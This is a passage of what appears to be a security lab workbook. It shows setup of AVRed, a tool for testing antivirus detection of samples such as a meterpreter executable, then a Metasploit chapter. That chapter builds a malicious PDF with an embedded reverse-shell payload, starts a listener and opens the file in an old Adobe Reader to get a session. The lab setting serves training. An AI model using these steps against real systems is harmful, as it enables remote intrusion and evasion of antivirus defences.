<p>AVRed is the webgui that allows us to submit samples to the AVRed-Server, that then talks to the configured Antivirus API.</p>
</blockquote>
<pre><code class="language-powershell">cd git
git clone https://github.com/dobin/avred.git
pip install -R requirements.txt
</code></pre>
<p>Edit the config.yaml</p>
<pre><code class="language-yaml">server:
  Amsi: &quot;http://localhost:8001/&quot;
password: &quot;&quot;
hashCache: True
WebMaxFileSizeMb: 50
</code></pre>
<p>run a scan from commandline</p>
<pre><code class="language-powershell">python3 avred.py -f app/upload/meterpreter.exe 
</code></pre>
<p>Run the (GUI) server (this is running on your KALI machine)</p>
<pre><code class="language-bash">python3 avredweb.py
</code></pre>
<p>Browse to the server GUI (from windows or Kali)
<a href="http:%5C%5Clocalhost:5000">http:\\localhost:5000</a></p>
<p><img src="./images/avred_web.jpg" alt="image" /></p>
<p>Install as a service with NSSM</p>
<pre><code>nssm install AvredWeb &quot;C:\\Users\\threatadmin\\AppData\\Local\\Programs\\Python\\Python312\\python.exe&quot; &quot;C:\\git\\avred\\avredweb.py&quot;
nssm set AvredWeb AppDirectory &quot;C:\\git\\avred\\&quot;
nssm.exe start AvredWeb
</code></pre>
<h1><a class="header" href="#chapter-11---metasploit-basics" id="chapter-11---metasploit-basics">Chapter 1.1 - Metasploit Basics</a></h1>
<p>Log on to your Unbuntu VM with <strong>admin/admin</strong>, open a terminal prompt and start the metasploit console:</p>
<pre><code class="language-code">msfconsole
</code></pre>
<p><img src="./images/01_metasploit.jpg" alt="Screenshot" /></p>
<p>We're going to create a <code>malicious PDF</code> file which contains a meterpreter backdoor that sets up a reverse shell on port 12345. This attack requires an exploit on Adobe PDF, let's have a look which exploits are available within Metasploit to accomplish this.</p>
<pre><code class="language-code">search type:exploit platform:windows adobe pdf
</code></pre>
<p><img src="./images/02_metasploit.jpg" alt="Screenshot" /></p>
<p>As you can see these are all pretty old exploits, but they will do for our proof on concept. There are numerous or PDF readers (such as Foxit, Slim PDF, Nitro and others). New vulnerabilities come out every day and this shows how important keeping your 3rd party applications up to date is.</p>
<p>For now we're going to continue with <strong>adobe_pdf_embedded_exe</strong>.</p>
<pre><code class="language-code">use exploit/windows/fileformat/adobe_pdf_embedded_exe
</code></pre>
<p>We're going to create a simple windows <em>reverse TCP</em> payload that will connect back to our Ubuntu server on <em>Port 12345</em>. This payload will be embedded into the pdf.</p>
<pre><code class="language-code">set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.18.204
set LPORT 12345
exploit
</code></pre>
<p><img src="./images/03_metasploit.jpg" alt="Screenshot" /></p>
<p>Next step is to set up metasploit to listen to reverse TCP connections on port 12345:</p>
<p><img src="./images/04_metasploit.jpg" alt="Screenshot" /></p>
<pre><code class="language-code">back
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.18.204
set LPORT 12345
run
</code></pre>
<p>Open a new terminal window on your Ubuntu and copy your &quot;<strong>evil.pdf</strong>&quot; payload to &quot;/temp&quot;.</p>
<blockquote>
<p><strong><em>NOTE:</em></strong>  Remember to do this as super user, the root directory requires admin privileges. You can do this by typing &quot;<strong>sudo -i</strong>&quot; and entering your password.</p>
</blockquote>
<p><img src="./images/06_copypayload.jpg" alt="Screenshot" /></p>
<pre><code class="language-code">sudo -i
cd /root/.msfconsole/local/
ls -la
cp evil.pdf /temp
</code></pre>
<p>Now let's pivot to our Windows client and download the malicious PDF, we'll be using WinSCP - to transfer our &quot;evil.pdf&quot; from &quot;/temp&quot; to our windows desktop.</p>
<blockquote>
<p><strong><em>NOTE:</em></strong>  Create a new Site in WinSCP, File Protocol = SCP, Port Number =22, Username = admin, Password = admin. In the advanced options you can specify the default starting direcotry, put &quot;/temp&quot; there. Save the connection for later use. Connect to the Ubuntu manchine with WinSCP and download &quot;evil.pdf&quot; to your desktop.</p>
</blockquote>
<p><img src="./images/05_winscp.jpg" alt="Screenshot" /></p>
<p>Once the file is copied to your desktop, right-click the evil.pfd file and select open with &quot;Adobe Reader 9.0&quot;. Remember we are using an old version of adobe that is still vulnerable for this exploit.</p>
<p><img src="./images/07_rightclick.jpg" alt="Screenshot" /></p>
<p><img src="./images/8_adobe_1.jpg" alt="Screenshot" /></p>
<p><img src="./images/9_adobe_2.jpg" alt="Screenshot" /></p>
<p><img src="./images/10_session.jpg" alt="Screenshot" /></p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        

                        

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                

                
            </nav>

        </div>

        
        <!-- Livereload script (if served using the cli tool) -->
        <script type="text/javascript">
            var socket = new WebSocket("ws://localhost:3001");
            socket.onmessage = function (event) {
                if (event.data === "reload") {
                    socket.close();
                    location.reload(true); // force reload from server (not from cache)
                }
            };

            window.onbeforeunload = function() {
                socket.close();
            }
        </script>
        

        

        
        
        
        <script type="text/javascript">
            window.playpen_copyable = true;
        </script>
        

        

        
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        

        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        

        
        
        <script type="text/javascript">
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>
        
        

    </body>
</html>
